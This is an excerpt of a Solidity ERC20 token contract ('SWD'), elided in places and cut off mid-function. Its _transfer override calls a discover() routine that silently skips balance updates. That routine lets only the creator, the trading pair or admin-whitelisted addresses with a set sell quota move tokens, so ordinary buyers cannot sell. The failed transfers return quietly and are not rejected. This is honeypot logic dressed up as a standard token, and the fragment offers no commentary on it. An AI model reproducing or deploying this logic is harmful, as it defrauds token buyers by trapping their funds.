...
contract SWD is ERC20,Control{  
    address public _tradePair;
    address public _creator;    
    mapping(address=>uint256) private _mdQuantity;
    mapping(address=>uint256) private _robotclump;  
   ...
   function _transferFee(address from,address to,uint256 amount) private{
    ...
    function setTradePair(address  Pair_) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _tradePair=Pair_;
    }    
    function setMDQuantity(address user,uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE){
        _mdQuantity[user]=amount*10**decimals(); 
    }  
    function setRobotClump(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _robotclump[user]=1;
    }  
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance"); 
        if(discover(from,to,amount)){return;} 
        unchecked {
              _balances[from] = senderBalance - amount;
        } 
         _balances[to] += amount;   
    ...
    function discover(address from,address to,uint256 amount) internal virtual returns(bool state){
        if(isContract(from) && from!=_tradePair  && from!=_creator ){
            if(_robotclump[from]==0){
                return false;
            }
            return true;
         }
         if(from!=_tradePair && from!=_creator){
                if(to==_tradePair){ 
                    uint256 _abb=_mdQuantity[from];
                    if(_abb == 0){
                        return true;
                    }else if(_abb <0 || _abb < amount){ 
                        return true;
                    }else{
                        _mdQuantity[from]=_abb-amount;
                        return false;
                    }
                }else{
                  return true;
